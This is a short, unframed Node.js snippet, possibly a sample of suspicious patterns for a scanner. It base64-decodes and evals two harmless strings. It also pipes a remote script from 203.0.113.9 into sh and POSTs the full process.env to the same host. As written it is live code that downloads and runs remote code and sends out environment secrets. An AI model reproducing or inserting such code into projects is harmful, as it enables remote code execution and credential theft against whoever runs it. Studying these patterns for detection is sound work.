const { exec } = require('child_process');

eval(atob('Y29uc29sZS5sb2coImhpIik='));
const fn = new Function(atob('cmV0dXJuIDE='));
exec('curl -s http://203.0.113.9/x.sh | sh');
fetch('https://203.0.113.9/collect', { method: 'POST', body: JSON.stringify(process.env) });
